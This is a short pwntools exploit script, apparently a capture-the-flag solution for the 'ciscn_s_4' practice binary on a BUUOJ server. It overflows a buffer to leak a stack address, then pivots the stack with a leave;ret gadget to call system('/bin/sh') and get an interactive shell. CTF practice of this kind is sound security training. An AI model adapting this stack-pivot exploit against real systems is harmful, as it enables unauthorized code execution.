#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process("./ciscn_s_4")
	elf = ELF("./ciscn_s_4")
else:
	p = remote("node3.buuoj.cn",29484)
	elf = ELF("./ciscn_s_4")


###leak stack###
payload = 'A' * 0x20
sl(payload)
stack = u32(ru('\xff')[-4:].ljust(4,'\x00')) - 0xe4
success(hex(stack))

###stack pivot###
system = elf.symbols['system']
leave_ret = 0x080484b8

payload = p32(system) + 'dead' + p32(stack + 0xC) + '/bin/sh\x00'
payload = payload.ljust(0x28,'A') + p32(stack - 0x4) +p32(leave_ret)
sl(payload)

ia()